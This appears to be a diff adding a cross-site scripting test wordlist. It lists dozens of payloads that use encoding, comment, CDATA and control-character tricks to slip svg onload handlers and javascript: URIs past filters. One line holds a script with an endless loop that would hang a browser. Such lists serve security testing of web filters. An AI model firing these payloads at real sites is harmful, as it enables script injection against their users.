@@ -1,0 +1,38 @@
+xss_test
+&apos;&quot;&gt;&lt;svg onload=alert(1)&gt;
+&apos;&quot;&gt;&lt;svg onload=alert(2)>
+&apos;&quot;>&lt;svg onload=alert(3)&gt;
+&apos;&quot;>&lt;svg onload=alert(4)>
+<!--'"><-->svg onload=alert(5)<!-->-->
+<!--'"><-->svg onload=alert(6)>
+<!--'"><svg onload=alert(7)>-->
+<![CDATA["'><]]>svg onload=alert(8)>
+<![CDATA["'><]]>svg onload=alert(9)<![CDATA[>]]>
+&#39;&#34;&#62;&#60;svg onload=alert(10)&#62;
+&#39;&#34;>&#60;svg onload=alert(11)&#62;
+&#39;&#34;&#62;&#60;svg onload=alert(12)>
+&#39;&#34;>&#60;svg onload=alert(13)>
+&#x0027;&#x0022;&#x003E;&#x003C;svg onload=alert(14)&#x003E;
+&#x0027;&#x0022;&#x003E;&#x003C;svg onload=alert(15)>
+&#x0027;&#x0022;>&#x003C;svg onload=alert(16)&#x003E;
+&#x0027;&#x0022;>&#x003C;svg onload=alert(17)>
+%27%22%3E%3Csvg onload=alert(18)%3E
+%27%22>%3Csvg%20onload%3Dalert(19)>
+%27%22>%3Csvg onload=alert(20)>
+%27%22%3E%3Csvg%20onload%3Dalert(21)%3E
+%27%22%3E%3Csvg%20onload%3Dalert(22)>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(23);<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<IMG SRC=x on]]><![CDATA[load=alert(24);">]]>
+javascript:alert(25)
+java%0ascript:alert(26)
+java%09script:alert(27)
+java%0dscript:alert(28)
+java%0a%0dscript:alert(29)
+java%0d%0ascript:alert(30)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(31\)
+javascript://%0Aalert(32)
+javascript://anything%0D%0A%0D%0Awindow.alert(33)
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#51;&#52;&#41;&#59;
+&#x006A;&#x0061;&#x0076;&#x0061;&#x0073;&#x0063;&#x0072;&#x0069;&#x0070;&#x0074;&#x003A;alert(35)&#x003B;
+%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341
